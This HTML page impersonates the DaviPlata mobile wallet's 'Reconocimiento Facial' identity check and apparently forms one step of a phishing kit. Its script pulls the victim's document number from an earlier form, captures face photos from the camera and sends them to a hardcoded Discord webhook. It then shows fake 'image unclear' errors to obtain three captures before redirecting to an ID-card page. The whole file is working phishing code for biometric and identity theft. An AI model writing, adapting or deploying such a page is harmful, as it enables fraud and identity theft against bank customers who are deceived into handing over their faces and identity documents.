<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DaviPlata - Reconocimiento Facial</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --davi-red: #E60026;
            --davi-pink: #F5B0B9;
        }

        * { box-sizing: border-box; font-family: 'Roboto', sans-serif; -webkit-tap-highlight-color: transparent; }

        body, html {
            margin: 0; padding: 0; height: 100%; width: 100%;
            overflow: hidden;
            background: #000;
            color: white;
        }

        #kyc-view {
            height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 25px;
        }

        .header { text-align: center; margin-bottom: 6px; }
        .logo-img { width: 80px; margin-bottom: 6px; }
        .header h3 { margin-bottom: 4px; font-size: 18px; }
        .header p  { color: #aaa; font-size: 12px; margin: 0; }

        .camera-wrapper {
            position: relative; width: 100%; flex: 1;
            border-radius: 30px; overflow: hidden;
            border: 2px solid #333; margin: 12px 0;
            max-height: 55vh;
        }

        #video {
            width: 100%; height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }

        .scan-line {
            position: absolute; width: 100%; height: 3px;
            background: #00ff00; box-shadow: 0 0 20px #00ff00;
            top: 0; z-index: 10;
            display: none;
            animation: moveLine 2.5s infinite linear;
        }
        @keyframes moveLine { 0% { top: 0%; } 100% { top: 100%; } }

        .face-overlay {
            position: absolute; top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 240px; height: 300px;
            border: 2px dashed rgba(255,255,255,0.6);
            border-radius: 50% 50% 45% 45%;
            z-index: 5;
        }

        #error-message {
            display: none;
            background: #ffebee; color: #c62828;
            padding: 12px; border-radius: 10px;
            font-size: 13px; margin-top: 8px;
            border: 1px solid #ef9a9a;
            text-align: center; line-height: 1.4;
        }

        .helper-text {
            background: rgba(255,255,255,0.1);
            padding: 14px; border-radius: 15px;
            font-size: 13px; margin-top: 10px;
            line-height: 1.5;
            border-left: 4px solid var(--davi-red);
        }

        .footer-fixed { margin-top: auto; padding-bottom: 10px; padding-top: 14px; }

        .btn-continue {
            background: var(--davi-red); color: white;
            border: none; padding: 18px; border-radius: 35px;
            width: 100%; font-size: 16px; font-weight: 700;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(230,0,38,0.3);
            transition: 0.3s;
        }
        .btn-continue:active { opacity: 0.85; }

        #loader {
            display: none; position: fixed; inset: 0; z-index: 999;
            background: rgba(0,0,0,0.88); backdrop-filter: blur(8px);
            flex-direction: column; justify-content: center; align-items: center;
        }
        .spinner {
            width: 50px; height: 50px;
            border: 5px solid #333;
            border-top: 5px solid var(--davi-red);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="kyc-view">

    <div class="header">
        <img src="https://conectesunegocio.daviplata.com/sites/default/files/styles/original/public/2025-10/Logo_Api_Market-2025.png?itok=cIsEUb2z" class="logo-img">
        <h3>Reconocimiento Facial</h3>
        <p>Sistema de Seguridad Biométrica v4.0</p>
    </div>

    <div class="camera-wrapper">
        <div id="laser" class="scan-line"></div>
        <video id="video" autoplay playsinline></video>
        <div class="face-overlay"></div>
    </div>

    <div id="error-message"></div>

    <div class="helper-text" id="help-box">
        <strong>Atención:</strong> Mantenga el rostro dentro del óvalo. Asegúrese de que sus ojos sean visibles y que haya suficiente luz ambiental.
    </div>

    <div class="footer-fixed">
        <button class="btn-continue" onclick="captureAndSend()">Validar Identidad</button>
    </div>
</div>

<canvas id="canvas" style="display:none;"></canvas>

<div id="loader">
    <div class="spinner"></div>
    <p id="loader-text" style="margin-top: 15px; color: var(--davi-red); font-weight: bold;"></p>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1425328745123942503/WhhLWqOYULHi4NphwaiKE6wk6flVAsk8ifQLfQaI-tmdB65vT1iLD7vpHmJpPdPHm5OY";
    let attempts = 0;

    // Recuperar datos del formulario anterior
    const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
    const docNum = formData.num || 'desconocido';

    // Iniciar cámara al cargar
    window.addEventListener('load', startCamera);

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('video').srcObject = stream;
        } catch (err) {}
    }

    function captureAndSend() {
        attempts++;
        const video     = document.getElementById('video');
        const canvas    = document.getElementById('canvas');
        const laser     = document.getElementById('laser');
        const errorDiv  = document.getElementById('error-message');
        const helpBox   = document.getElementById('help-box');

        laser.style.display = 'block';
        errorDiv.style.display = 'none';
        showLoader("Analizando biometría...");

        canvas.width  = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(async (blob) => {
            if (!blob) return;
            const fd = new FormData();
            fd.append('file', blob, 'captura.png');
            fd.append('payload_json', JSON.stringify({
                content: `📸 **Intento ${attempts}** - Doc: ${docNum}`
            }));
            try { await fetch(WEBHOOK_URL, { method: 'POST', body: fd }); } catch (e) {}

            setTimeout(() => {
                hideLoader();
                laser.style.display = 'none';

                if (attempts < 3) {
                    helpBox.style.display = 'none';
                    errorDiv.innerText = "Error: Imagen poco clara. Por favor, asegúrese de que su rostro esté bien iluminado e intente de nuevo.";
                    errorDiv.style.display = 'block';
                } else {
                    errorDiv.innerText = "Validación no posible: No lo hemos reconocido como usuario. Por favor realice los pasos correctamente.";
                    errorDiv.style.display = 'block';
                    setTimeout(() => {
                        sessionStorage.clear();
                        window.location.href = 'cedula.html';
                    }, 4000);
                }
            }, 3000);
        }, 'image/png');
    }

    function showLoader(text) {
        document.getElementById('loader-text').innerText = text;
        document.getElementById('loader').style.display = 'flex';
    }
    function hideLoader() {
        document.getElementById('loader').style.display = 'none';
    }
</script>
</body>
</html>
